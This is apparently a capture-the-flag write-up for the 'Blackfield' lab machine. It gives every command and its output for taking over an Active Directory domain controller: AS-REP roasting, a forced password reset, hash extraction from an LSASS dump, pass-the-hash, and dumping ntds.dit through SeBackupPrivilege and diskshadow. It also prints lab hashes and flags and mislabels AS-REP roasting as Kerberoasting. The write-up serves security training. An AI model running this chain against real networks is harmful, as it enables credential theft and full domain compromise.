
# SUMMARY

This penetration test successfully compromised the BLACKFIELD.local domain, achieving full Domain Administrator privileges. Initial reconnaissance identified the domain controller and enumerated user accounts via anonymous SMB access to the `profiles$` share. Kerberoasting the user list revealed that the `support` account had Kerberos pre-authentication disabled, allowing its Ticket-Granting-Ticket (TGT) to be captured and cracked offline, yielding the password `#00^BlackKnight`. This credential provided initial access via SMB but not WinRM. BloodHound analysis identified that the `support` user possessed the `ForceChangePassword` privilege over the `audit2020` user, whose password was subsequently reset. As `audit2020`, read access to the `forensic` SMB share was obtained, from which a critical `lsass.zip` memory dump was downloaded. Analysis of this dump with pypykatz exposed the NTLM hash for the `svc_backup` service account, which was used to gain a shell via Pass-The-Hash over WinRM. This account held the `SeBackupPrivilege`, which was leveraged to create a shadow copy of the C: drive using `diskshadow`. The `ntds.dit` database and associated `SYSTEM` hive were then extracted from this copy. These files were downloaded and processed locally with `secretsdump.py` to retrieve the NTLM hash for the `Administrator` account, which was used in a final Pass-The-Hash attack to gain a privileged shell and retrieve the root flag, concluding the assessment.


# NMAP

Initial reconnaissance with `sudo nmap -sC -sV 10.129.229.17 --open` reveals an Active Directory domain `BLACKFIELD.local` with standard ports open.

```bash
 sudo nmap -sC -sV  10.129.229.17  --open 
```

The nmap scan confirms the domain BLACKFIELD.local and identifies the host DC01. Key services include SMB (445) and WinRM (5985), which will be used for remote access. The SMB signing requirement is noted.

```output
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-30 16:09:35Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-30T16:09:47
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m13s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 198.77 seconds


```

The `nxc smb` scan confirms the target is a Domain Controller (DC01) running Windows Server 2019, domain BLACKFIELD.local, with SMB signing enabled.

```bash
nxc smb 10.129.229.17 
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False) 
```

The `/etc/hosts` file has been updated to resolve the domain BLACKFIELD.local and hostname DC01 to the target IP address 10.129.229.17.

```bash
cat  /etc/hosts
10.129.229.17  DC01  BLACKFIELD.local  DC01.BLACKFIELD.local  
```

Anonymous LDAP bind is not permitted on the domain controller, as indicated by the "operationsError".

```bash
nxc ldap 10.129.229.17   -u '' -p ''
LDAP        10.129.229.17   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
LDAP        10.129.229.17   389    DC01             [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090A69, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563
LDAP        10.129.229.17   389    DC01             [+] BLACKFIELD.local\: 
```

Anonymous SMB login is successful. This allows for enumeration of shares and other information without credentials.

```bash
nxc smb 10.129.229.17   -u '' -p ''
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False) 
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\: 
                                            

```


Anonymous WinRM login fails, indicating that authentication is required for this service

```bash
nxc winrm 10.129.229.17   -u '' -p ''
WINRM       10.129.229.17   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
WINRM       10.129.229.17   5985   DC01             [-] BLACKFIELD.local\: SpnegoError (16): Operation not supported or available, Context: Retrieving NTLM store without NTLM_USER_FILE set to a filepath
```

he `smbclient` list reveals available shares, including a non-standard share named `forensic` which is a potential point of interest for enumeration.

```bash
smbclient -L //DC01.BLACKFIELD.local  
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles$       Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to DC01.BLACKFIELD.local failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available

```


Access to the `SYSVOL` share is denied with a null session, indicating restricted permissions.
```bash
 smbclient -N //DC01.BLACKFIELD.local/SYSVOL  

Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
smb: \> dir
```

Connected to the `profiles$` share anonymously. This share contains user profile directories

```bash
smbclient -N //DC01.BLACKFIELD.local/profiles$   
```

The `profiles$` share listing provides a comprehensive list of domain usernames for further enumeration and attack.

```bash
Vanarsdel                          D        0  Wed Jun  3 12:47:12 2020
  NBellibas                           D        0  Wed Jun  3 12:47:12 2020
  NDikoka                             D        0  Wed Jun  3 12:47:12 2020
  NGenevro                            D        0  Wed Jun  3 12:47:12 2020
  NGoddanti                           D        0  Wed Jun  3 12:47:12 2020
  NMrdirk                             D        0  Wed Jun  3 12:47:12 2020
  NPulido                             D        0  Wed Jun  3 12:47:12 2020
  NRonges                             D        0  Wed Jun  3 12:47:12 2020
  NSchepkie                           D        0  Wed Jun  3 12:47:12 2020
  NVanpraet                           D        0  Wed Jun  3 12:47:12 2020
  OBelghazi                           D        0  Wed Jun  3 12:47:12 2020
  OBushey                             D        0  Wed Jun  3 12:47:12 2020
  OHardybala                          D        0  Wed Jun  3 12:47:12 2020
  OLunas                              D        0  Wed Jun  3 12:47:12 2020
  ORbabka                             D        0  Wed Jun  3 12:47:12 2020
  PBourrat                            D        0  Wed Jun  3 12:47:12 2020
  PBozzelle                           D        0  Wed Jun  3 12:47:12 2020
  PBranti                             D        0  Wed Jun  3 12:47:12 2020
  PCapperella                         D        0  Wed Jun  3 12:47:12 2020
  PCurtz                              D        0  Wed Jun  3 12:47:12 2020
  PDoreste                            D        0  Wed Jun  3 12:47:12 2020
  PGegnas                             D        0  Wed Jun  3 12:47:12 2020
  PMasulla                            D        0  Wed Jun  3 12:47:12 2020
  PMendlinger                         D        0  Wed Jun  3 12:47:12 2020
  PParakat                            D        0  Wed Jun  3 12:47:12 2020
  PProvencer                          D        0  Wed Jun  3 12:47:12 2020
  PTesik                              D        0  Wed Jun  3 12:47:12 2020
  PVinkovich                          D        0  Wed Jun  3 12:47:12 2020
  PVirding                            D        0  Wed Jun  3 12:47:12 2020
  PWeinkaus                           D        0  Wed Jun  3 12:47:12 2020
  RBaliukonis                         D        0  Wed Jun  3 12:47:12 2020
  RBochare                            D        0  Wed Jun  3 12:47:12 2020
  RKrnjaic                            D        0  Wed Jun  3 12:47:12 2020
  RNemnich                            D        0  Wed Jun  3 12:47:12 2020
```

The usernames from the `profiles$` share have been parsed and saved to `user_list` for use with tools like `kerbrute`.

```bash
cat users.txt | awk '{print $1}'>user_list
```

The `GetNPUsers.py` command is executed to perform Kerberoasting and identify users with Kerberos pre-authentication disabled, saving any retrieved TGTs to `userhash.txt`

```bash
GetNPUsers.py BLACKFIELD.local/ -usersfile user_list -dc-ip 10.129.229.17 -outputfile userhash.txt
```

The command successfully retrieves a Kerberos TGT for the user `support` who has Do Not Require Pre-Authentication (DONT_REQ_PREAUTH) set. The hash is saved for cracking.

```bash
$krb5asrep$23$support@BLACKFIELD.LOCAL:8c58dd4f193c36625015db9f54eed737$ef665c8ba86e38ec5ec6ce135c82ccb2a4eadd06f42107652d5022df5955e72f5558c0f22a146c02036671ace387b78735d5ad7f61a978cc0a29698a9739d1cce920b09e335bf833b0c49ae0058833623499b47cf4233bc6076a376ce7846c83ef739071b3b145df8fd4cbc4af08c49178ec863cd0a9d3c1471f4396cbc8710b09c18c09c067e01810734a1dc0e5f084815cb93bf75fe52d274f60b397d6a427c7df1be929af22285f18dca6d7e8627803bd80074df14d5eb41297a1b1d33c84e74bd1d6360f0aecbbc4b9bf4bb0abf9d0ea06b4fa3a419c59fcd7182706938ea146da1de6de17fd4a0fe2df23f5ed744c82e14f
```

The password for the user `support` has been successfully cracked as `#00^BlackKnight`.

```bash
john  --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)     
1g 0:00:00:28 DONE (2025-10-30 05:53) 0.03510g/s 503158p/s 503158c/s 503158C/s #1ByNature..#*burberry#*1990
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 


```

SMB login successful with the credentials `support`:`#00^BlackKnight`.

```bash
 nxc smb  10.129.229.17   -u 'support' -p '#00^BlackKnight'

SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False) 
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
                         
```

WinRM login for user `support` failed. Access is denied via this protocol.

```bash
nxc winrm  10.129.229.17   -u 'support' -p '#00^BlackKnight'

WINRM       10.129.229.17   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
WINRM       10.129.229.17   5985   DC01             [-] BLACKFIELD.local\support:#00^BlackKnight
```

No Service Principal Names (SPNs) are found for the user `support`, indicating Kerberoasting is not a viable path with these credentials.


```bash
impacket-GetUserSPNs -request BLACKFIELD.local/support:#00^BlackKnight  -dc-ip 10.129.229.17 
Impacket v0.13.0.dev0+20250528.4535.5b338613 - Copyright Fortra, LLC and its affiliated companies 

No entries found!
```

BloodHound data collection initiated for the `support` user. The data will be collected and zipped for analysis in the BloodHound GUI.

```bash
 bloodhound-python -u 'support' -p '#00^BlackKnight' -d 'BLACKFIELD.local' -c All -ns 10.129.229.17 -v --zip
```

I get zip file

```output
Compressing output into 20251030061645_bloodhound.zip

```

The file  contains the usernames `support` and `AU0172020@BLACKFIELD.LOCAL`. The user `audit2020` is identified for further action.

![[Pasted image 20251030103237.png]]

The password for the user `audit2020` has been successfully changed to `Password123!!!` using `rpcclient`

```bash
rpcclient 10.129.229.17 -U "support"

Password for [WORKGROUP\support]:
rpcclient $> setuserinfo2 audit2020 23 'Password123!!!'
rpcclient $> exit
```

SMB login successful with the new credentials `audit2020`:`Password123!!!`.
```bash
nxc smb  10.129.229.17   -u 'audit2020' -p 'Password123!!!'

SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False) 
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\audit2020:Password123!!! 

```

The user `audit2020` has Read permissions on the `forensic` share. This share should be explored for sensitive files.

```bash
nxc smb  10.129.229.17   -u 'audit2020' -p 'Password123!!!' --shares                                                                                                  

SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False) 
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\audit2020:Password123!!! 
SMB         10.129.229.17   445    DC01             [*] Enumerated shares
SMB         10.129.229.17   445    DC01             Share           Permissions     Remark
SMB         10.129.229.17   445    DC01             -----           -----------     ------
SMB         10.129.229.17   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.229.17   445    DC01             C$                              Default share
SMB         10.129.229.17   445    DC01             forensic        READ            Forensic / Audit share.
SMB         10.129.229.17   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.229.17   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.229.17   445    DC01             profiles$       READ            
SMB         10.129.229.17   445    DC01             SYSVOL          READ            Logon server share 
                                                                                               

```

The `lsass.zip` memory dump has been successfully downloaded from the `forensic` share. This file can be analyzed to extract credentials.
```bash
smbclient //10.129.229.17/forensic   -U  audit2020 
mb: \memory_analysis\> ls
  .                                   D        0  Thu May 28 16:28:33 2020
  ..                                  D        0  Thu May 28 16:28:33 2020
  conhost.zip                         A 37876530  Thu May 28 16:25:36 2020
  ctfmon.zip                          A 24962333  Thu May 28 16:25:45 2020
  dfsrs.zip                           A 23993305  Thu May 28 16:25:54 2020
  dllhost.zip                         A 18366396  Thu May 28 16:26:04 2020
  ismserv.zip                         A  8810157  Thu May 28 16:26:13 2020
  lsass.zip                           A 41936098  Thu May 28 16:25:08 2020
  mmc.zip                             A 64288607  Thu May 28 16:25:25 2020
  RuntimeBroker.zip                   A 13332174  Thu May 28 16:26:24 2020
  ServerManager.zip                   A 131983313  Thu May 28 16:26:49 2020
  sihost.zip                          A 33141744  Thu May 28 16:27:00 2020
  smartscreen.zip                     A 33756344  Thu May 28 16:27:11 2020
  svchost.zip                         A 14408833  Thu May 28 16:27:19 2020
  taskhostw.zip                       A 34631412  Thu May 28 16:27:30 2020
  winlogon.zip                        A 14255089  Thu May 28 16:27:38 2020
  wlms.zip                            A  4067425  Thu May 28 16:27:44 2020
  WmiPrvSE.zip                        A 18303252  Thu May 28 16:27:53 2020

                5102079 blocks of size 4096. 1693358 blocks available
smb: \memory_analysis\> get   lsass.zip   
getting file \memory_analysis\lsass.zip of size 41936098 as lsass.zip (8288.4 KiloBytes/sec) (average 8288.4 KiloBytes/sec)
smb: \memory_analysis\> exit

```

The LSASS memory dump analysis with `pypykatz` reveals the NTLM hash for the user `svc_backup`: `9658d1d1dcd9250115e2205d9f48400d`. This hash can be used for Pass-The-Hash attacks.

```bash
pypykatz lsa minidump lsass.DMP

zsh: /home/kali/.local/bin/pypykatz: bad interpreter: /home/kali/.local/share/pipx/venvs/pypykatz/bin/python: no such file or directory
INFO:pypykatz:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
  == MSV ==
   Username: svc_backup
   Domain: BLACKFIELD
   LM: NA
   NT: 9658d1d1dcd9250115e2205d9f48400d
   SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
   DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
  == WDIGEST [633ba]==
   username svc_backup
   domainname BLACKFIELD
   password None
   password (hex)
  == Kerberos ==
   Username: svc_backup
   Domain: BLACKFIELD.LOCAL
  == WDIGEST [633ba]==
   username svc_backup
   domainname BLACKFIELD
   password None
   password (hex)

== LogonSession ==
authentication_id 365835 (5950b)
session_id 2
username UMFD-2
domainname Font Driver Host
logon_server 
logon_time 2020-02-23T17:59:38.218491+00:00
sid S-1-5-96-0-2
luid 365835
  == MSV ==
   Username: DC01$
   Domain: BLACKFIELD
   LM: NA
   NT: b624dc83a27cc29da11d9bf25efea796
   SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
   DPAPI: 0000000000000000000000000000000000000000
  == WDIGEST [5950b]==
   username DC01$
   domainname BLACKFIELD
   password None
   password (hex)
  == Kerberos ==
   Username: DC01$
   Domain: BLACKFIELD.local
   Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
   password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
  == WDIGEST [5950b]==
   username DC01$
   domainname BLACKFIELD
   password None
   password (hex)

== LogonSession ==
authentication_id 365493 (593b5)
session_id 2
username UMFD-2
domainname Font Driver Host
logon_server 
logon_time 2020-02-23T17:59:38.200147+00:00
sid S-1-5-96-0-2
luid 365493
  == MSV ==
   Username: DC01$
   Domain: BLACKFIELD
   LM: NA
   NT: b624dc83a27cc29da11d9bf25efea796
   SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
   DPAPI: 0000000000000000000000000000000000000000
  == WDIGEST [593b5]==
   username DC01$
   domainname BLACKFIELD
   password None
   password (hex)
  == Kerberos ==
   Username: DC01$
   Domain: BLACKFIELD.local
   Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
   password (hex)260053005900560045002b003c0079006e00750

```

Successfully established an Evil-WinRM shell as the user `svc_backup` using the Pass-The-Hash technique

```bash
evil-winrm -i 10.129.229.17  -u svc_backup  -H 9658d1d1dcd9250115e2205d9f48400d
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint

```

The user flag is `3920bb317a0bef51027e2852be64b543`.

```bash
Evil-WinRM* PS C:\Users\svc_backup\Desktop> type user.txt
3920bb317a0bef51027e2852be64b543

```

The user `svc_backup` has the `SeBackupPrivilege` and `SeRestorePrivilege`, which can be abused for Domain Administrator privilege escalation.

```bash
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


```

A `diskshadow.txt` script has been created to prepare for a volume shadow copy of the C: drive.
```bash
*Evil-WinRM* PS C:\ProgramData> cd temp
*Evil-WinRM* PS C:\ProgramData\temp> echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii
*Evil-WinRM* PS C:\ProgramData\temp> echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append
*Evil-WinRM* PS C:\ProgramData\temp> echo "create" | out-file ./diskshadow.txt -encoding ascii -append 
*Evil-WinRM* PS C:\ProgramData\temp> echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append
*Evil-WinRM* PS C:\ProgramData\temp> ls
```

The `diskshadow.txt` script is confirmed. It will create a persistent shadow copy of the C: drive and expose it as the Z: drive.

```bash
*Evil-WinRM* PS C:\ProgramData\temp> cat diskshadow.txt
 
set context persistent nowriters
add volume c: alias temp
create
expose %temp% z:

```

The `diskshadow.exe` command is executed using the script to create a shadow copy of the C: drive.

```bash
diskshadow.exe /s C:\ProgramData\temp\diskshadow.txt
```

The shadow copy has been successfully created and exposed as the Z: drive. The `ntds.dit` database can now be copied from `Z:\Windows\NTDS\ntds.dit`

```output
* Shadow copy ID = {39d5563e-f7a9-4db8-880c-ad24ae3ba07b}     %temp%
   - Shadow copy set: {6c3644df-4096-42eb-98ca-a14cc761df4f} %VSS_SHADOW_SET%
   - Original count of shadow copies = 1
   - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
   - Creation time: 10/30/2025 12:05:44 PM
   - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
   - Originating machine: DC01.BLACKFIELD.local
   - Service machine: DC01.BLACKFIELD.local
   - Not exposed
   - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
   - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %temp% z:
-> %temp% = {39d5563e-f7a9-4db8-880c-ad24ae3ba07b}
The shadow copy was successfully exposed as z:\.
```

The `robocopy` command with the `/b` (backup mode) flag is used to copy the `SAM` hive from the shadow copy to `C:\temp`.

```bash
 robocopy /b Z:\Windows\System32\Config C:\temp SAM
```

The `SAM` hive has been successfully copied to `C:\temp`. Next, the `SYSTEM` hive should be copied using the same method.

```output
ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Thursday, October 30, 2025 12:06:53 PM
   Source : Z:\Windows\System32\Config\
     Dest : C:\temp\

    Files : SAM

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

    New Dir          1 Z:\Windows\System32\Config\
      New File       65536   SAM
  0%
100%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         1         0         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :    64.0 k    64.0 k         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :             4369066 Bytes/sec.
   Speed :             250.000 MegaBytes/min.
   Ended : Thursday, October 30, 2025 12:06:53 PM

```

```bash
robocopy /b Z:\Windows\System32\Config C:\temp SYSTEM
```

```output
       Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   17.00 m   17.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :            94818042 Bytes/sec.
   Speed :            5425.531 MegaBytes/min.
   Ended : Thursday, October 30, 2025 12:07:09 PM

```

The `SYSTEM` hive has been successfully copied to `C:\temp`. Now the `ntds.dit` database file should be copied from `Z:\Windows\NTDS\`.

```bash
robocopy /b Z:\Windows\NTDS C:\temp ntds.dit
```

The `ntds.dit` database file has been successfully copied to `C:\temp`. All necessary files (`ntds.dit`, `SYSTEM`, `SAM`) are now in the `C:\temp` directory for credential extraction.

```output

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   18.00 m   18.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           109734697 Bytes/sec.
   Speed :            6279.069 MegaBytes/min.
   Ended : Thursday, October 30, 2025 12:07:36 PM


```

The files `ntds.dit`, `SAM`, and `SYSTEM` are confirmed present in `C:\temp`. They can now be downloaded.

```bash
Evil-WinRM* PS C:\ProgramData\temp> ls C:\temp\


    Directory: C:\temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/30/2025   9:03 AM       18874368 ntds.dit
-a----        4/10/2023   6:29 PM          65536 SAM
-a----        4/10/2023   6:29 PM       17825792 SYSTEM
```

The files `ntds.dit`, `SAM`, and `SYSTEM` have been successfully downloaded to the attacker machine. Now use `secretsdump.py` to extract the NTLM hashes.

```bash
*Evil-WinRM* PS C:\temp> download ntds.dit
                                        
Info: Downloading C:\temp\ntds.dit to ntds.dit
                                        
Info: Download successful!
*Evil-WinRM* PS C:\temp> download SAM
                                        
Info: Downloading C:\temp\SAM to SAM
                                        
Info: Download successful!
*Evil-WinRM* PS C:\temp> download SYSTEM
                                        
Info: Downloading C:\temp\SYSTEM to SYSTEM
                                        
Info: Download successful!


```

The `secretsdump.py` command is executed to extract password hashes from the `ntds.dit` database using the local `SYSTEM` hive.

```bash
 secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL
```

The NTLM hash for the Administrator user has been successfully dumped: `184fb5e5178480be64824d4cd53b99ee`. This can be used for Pass-The-Hash to gain administrative access.

```output
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:b619429d3c282e0c367cae942e43837f:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::

```

Successfully established an Evil-WinRM shell as the Administrator user using Pass-The-Hash. The system is now fully compromised.

```bash
evil-winrm -i 10.129.229.17  -u Administrator  -H 184fb5e5178480be64824d4cd53b99ee
```

The root flag is `4375a629c7c67c8e29db269060c955cb`. The BlackField machine is complete.

```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
4375a629c7c67c8e29db269060c955cb


```